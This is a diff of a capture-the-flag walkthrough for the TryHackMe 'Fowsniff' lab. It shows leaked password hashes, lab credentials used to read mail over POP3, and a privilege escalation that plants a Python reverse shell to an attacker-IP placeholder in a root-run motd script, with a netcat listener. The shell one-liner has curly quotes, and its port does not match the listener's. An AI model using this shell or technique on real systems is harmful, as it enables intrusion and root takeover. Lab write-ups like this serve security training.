@@ -24,7 +24,7 @@ Port 143 for IMAP.<br>
 ![image](https://github.com/user-attachments/assets/8cc0076b-1fdb-4be5-8ff5-10c7b241feab)
 #### It seems to have been hacked, as expected. The attacker seems to have leaked the passwords as can be seen in the pinned tweet. Let's open the pastebin link to see the file.
 
-By going to ```https://pastebin.com/NrAqVeeX``` we get the following password hashes with email addresses:
+By going to [fowsniff.txt](https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt) we get the following password hashes with email addresses:
 ```
 mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
 mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
@@ -94,3 +94,44 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-20 19:05:
 1 of 1 target successfully completed, 1 valid password found
 ```
 #### We confirm that 1 account is still valid: ```seina:scoobydoo2```
+
+#### Let's try to connect to the email service using Seina's credentials.
+#### To do this, I did a quick search and found this site:  [pop3-commands](https://electrictoolbox.com/pop3-commands/)
+
+#### So, we can execute the command ```telnet 10.10.157.167 110``` to connect to the email server using telnet.
+#### After that, we can issue the command ```USER seina``` followed by the commands ```PASS scoobydoo2``` and we can see that we are logged in.
+#### Now, we can execute the command ```LIST``` to see the list of emails which shows us the message summary with the message number and the byte size of the message.
+#### We can do a ```RETR 1``` to retrieve the 1st message. On doing that, we see it is from ```stone@fowsniff``` and it seems its sent to all other employees.
+
+#### From the message we get the temporary SSH password:
+```
+S1ck3nBluff+secureshell
+```
+#### Similarly, we can retrieve the second email, but we don't see anything useful in that.
+#### Now, let's try to connect to the SSH login account using the Stone account using this password, as shown in the following question:
+```
+ssh stone@10.10.157.167
+```
+#### This password doesn't seem to work with ```Stone``` or ```Seina```. Let's see if it works with ```Baksteen```, as the second email was sent by them.
+#### And it worked! We logged into the system as ```baksteen```.
+
+## Privilege Escalation
+
+#### Let's see what groups the user belongs to. We can do this using the ```groups``` command. We can see that ```baksteen``` is part of the ```user``` and baksteen groups. Let's see if there are any interesting files that can be executed by users of these groups.
+
+#### We see an interesting file, ```/opt/cube/cube.sh``` . When we check the permissions, we see that it is owned by the ```user``` group, and we can write to this file. We can see that this file is executed by root whenever the Message of The Day file in ```/etc/update-motd.d/00-header``` is executed (whenever we log into the machine via SSH), so let's include some reverse shell code inside the file. We can use the Python reverse shell provided by TryHackMe:
+```
+python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
+```
+#### We can replace <IP> with the attacker's IP address (in quotes), and  with whatever port we want to receive a reverse connection on.
+#### Now we can set up a netcat listener on the attacker's machine where we will receive a reverse connection: ``` nc -lvnp 4444 ```
+
+#### Once we have everything set up, we can connect to the machine using SSH again as ``` baksteen ```.
+
+#### And right after logging into the machine, we get a reverse shell connection again as  ``` root ``` on the netcat listener!
+
+![image](https://github.com/user-attachments/assets/1e78a34a-f306-4e9e-b3ec-8cc9635e50ac)
+
+Root access
+
+#### Thank you very much for reading .
